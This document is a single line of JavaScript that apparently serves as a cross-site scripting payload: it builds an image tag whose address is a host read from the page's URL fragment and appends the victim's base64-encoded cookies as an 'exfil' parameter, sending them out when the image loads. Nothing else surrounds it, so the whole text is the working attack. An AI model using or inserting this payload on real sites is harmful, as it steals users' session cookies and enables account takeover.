injimg = document.createElement('img');injimg.src='https://'+location.hash.slice(1)+'/get?exfil='+btoa(document.cookie); document.head.append(injimg)
